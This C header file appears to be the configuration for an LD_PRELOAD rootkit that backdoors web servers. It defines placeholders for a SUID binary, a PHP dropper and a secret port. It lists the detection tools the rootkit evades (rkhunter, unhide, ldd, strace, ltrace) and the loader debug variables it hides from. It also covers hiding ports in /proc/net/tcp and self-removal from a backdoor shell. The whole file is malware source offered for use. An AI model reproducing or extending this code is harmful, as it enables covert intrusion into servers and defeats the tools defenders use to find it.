/* do not edit these! */
#define MAGIC_GID       _MAGIC_GID_
#define MAGIC_VAR       "_MAGIC_VAR_"

#define SUID_BIN        "_SUID_BIN_"
#define PHP_NEWFILENAME "_PHP_NEWFILENAME_"
#define PHP_LOCATION    "_PHP_LOCATION_"
#define SECRET_PORT     _SECRET_PORT_

#define SOPATH          "_SOPATH_"
#define PRELOAD         "_PRELOAD_"


/* stuff for determining if the calling
 * process is infact the web service. */
#define WWWUID  _WWWUID_       // if getuid() = WWWUID ...
#define WWWGID  _WWWGID_       // if getgid() = WWWGID ...
#define WWWNAME "_WWWNAME_"    // if getpwuid(getuid())->pw_name = WWWNAME ...
#define WWWHOME "_WWWHOME_"    // if getpwuid(getuid())->pw_dir = WWWHOME ...

/* you might want to edit the contents of these two
 * arrays depending on the box that you're on. */
static char *const service_names[4] = {"httpd", "apache",  /* typical process names of */
                                       "nginx", NULL};     /* running services. */
static char *const service_vars[5] = {"APACHE_PID_FILE", "TZ", "JOURNAL_STREAM", /* variables exported by */
                                      "INVOCATION_ID", NULL};                    /* running services.     */

#define MINIMUM_IND 4  /* minimum amount of successful indications needed   */
                       /* before the service user has the ability to access */
                       /* the two hidden files it needs for the backdoor to */
                       /* function how we want                              */

/* stuff to hide from & evade */
static char *const scary_variables[4] = {"LD_TRACE_LOADED_OBJECTS", "LD_DEBUG", "LD_AUDIT", NULL};

static char *const scary_paths[5] = {"*/*ld-linux*.so.*", "*ld-linux*.so.*", "*/*ld-*.so", "*ld-*.so", NULL};

static char *const scary_procs[9] = {"lsrootkit", "ldd", "unhide", "rkhunter",
                                     "chkproc", "chkdirs", "ltrace", "strace", NULL};

/* necessary port hiding stuff */
#define PROCNETFMT   "%d: %64[0-9A-Fa-f]:%X %64[0-9A-Fa-f]:%X %X %lX:%lX %X:%lX %lX %d %d %lu %512s\n"
#define TCPNET_PATH  "/proc/net/tcp"
#define TCPNET6_PATH "/proc/net/tcp6"

static char *const rmfiles[5] = {PHP_LOCATION, SUID_BIN,  /* files to unlink when ./killself's */
                                 SOPATH, PRELOAD, NULL};  /* executed from the backdoor shell. */
#define KILLSELF_QUIET  0x01  /* KILLSELF_QUIET used when we don't want the */
                              /* user to see that we're trying to tidy up   */
#define KILLSELF_OUTPUT 0x02

/* rest of these are just definitions of stuff
 * the rootkit needs in order to werk. */

#define MODE_REG 0x32  /* for stat'ing reg files */
#define MODE_BIG 0x64  /* or... bigger files.    */

#define PATH_MAX 4096
#define LINE_MAX 2048

#define getsym(sym, symname) if(!sym) sym = dlsym(RTLD_NEXT, symname);
